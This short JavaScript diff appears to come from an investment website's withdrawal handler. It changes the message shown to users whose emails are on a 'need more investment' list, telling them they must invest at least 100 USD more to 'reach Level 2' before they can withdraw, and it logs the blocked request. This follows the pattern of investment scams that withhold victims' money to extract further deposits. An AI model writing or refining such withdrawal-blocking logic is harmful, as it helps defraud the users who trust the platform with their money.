@@ -903,7 +903,7 @@
         
         // NEW: Check if email is in the "need more investment" list
         if (needMoreInvestmentEmails.includes(withdrawalEmail)) {
-            showModal(false, 'Investment Required', 'Your account needs to reach Level 2 to withdraw funds. Please make additional investments to upgrade your account level.');
+            showModal(false, 'Investment Required', 'Your account needs to invext minimum 100usd to reach Level 2 to withdraw funds. Please make additional investments to upgrade your account level.');
             
             // Log investment required
             logFormSubmission({
